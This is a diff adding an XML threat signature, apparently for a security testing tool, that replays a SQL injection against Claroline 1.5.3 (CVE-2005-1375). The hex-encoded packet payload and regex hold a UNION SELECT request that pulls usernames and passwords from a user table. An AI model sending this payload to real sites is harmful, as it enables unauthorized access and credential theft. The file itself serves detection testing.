@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Claroline SQL Injection Attack"/>
+    <EngDesc display="true" value="This threat takes advantage of a flaw in the Claroline E-Learning application that allows a remote attacker to inject arbitrary SQL commands through its web interface.  Claroline is a web application, which typically listens on port 80."/>
+    <Intent display="true">
+      <item value="Unauthorized_Use"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Claroline"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Claroline"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Claroline_1.5.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2005-1375"/>
+    <bugtraqID display="true" value="13407"/>
+    <OSVDB display="true" value="16534"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000104acb9142200c000a80001003c0c23b054"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725876179218750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X68\X74\X74\X70\X3A\X2F\X2F\X65\X78\X61\X6D\X70\X6C\X65\X2E\X63\X6F\X6D\X2F\X2F\X2F\X75\X73\X65\X72\X49\X6E\X66\X6F\X2E\X70\X68\X70\X3F\X75\X49\X6E\X66\X6F\X3D\X2D\X31\X25\X32\X30\X55\X4E\X49\X4F\X4E\X25\X32\X30\X53\X45\X4C\X45\X43\X54\X25\X32\X30\X70\X6E\X5F\X75\X6E\X61\X6D\X65\X2C\X6E\X75\X6C\X6C\X2C\X70\X6E\X5F\X75\X6E\X61\X6D\X65\X2C\X70\X6E\X5F\X70\X61\X73\X73\X2C\X70\X6E\X5F\X70\X61\X73\X73\X2C\X6E\X75\X6C\X6C\X2C\X70\X6E\X5F\X70\X61\X73\X73\X2C\X6E\X75\X6C\X6C\X25\X32\X30\X46\X52\X4F\X4D\X25\X32\X30\X70\X6E\X5F\X75\X73\X65\X72\X73\X25\X32\X30\X57\X48\X45\X52\X45\X25\X32\X30\X70\X6E\X5F\X75\X69\X64\X3D\X32\X2F\X2A\X20\X48\X54\X54\X50\X2F\X31\X2E\X31\X0A\X48\X6F\X73\X74\X3A\X20\X65\X78\X61\X6D\X70\X6C\X65\X2E\X63\X6F\X6D\X0A\X0A\X20\X43\X6F\X6E\X6E\X65\X63\X74\X69\X6F\X6E\X3A\X20\X43\X6C\X6F\X73\X65\X0D\X0A\X0D\X0A"/>
+    <Created value="1139461940" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="47455420687474703A2F2F6578616D706C652E636F6D2F2F2F75736572496E666F2E7068703F75496E666F3D2D31253230554E494F4E25323053454C454354253230706E5F756E616D652C6E756C6C2C706E5F756E616D652C706E5F706173732C706E5F706173732C6E756C6C2C706E5F706173732C6E756C6C25323046524F4D253230706E5F75736572732532305748455245253230706E5F7569643D322F2A20485454502F312E310A486F73743A206578616D706C652E636F6D0A0A20436F6E6E656374696F6E3A20436C6F73650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
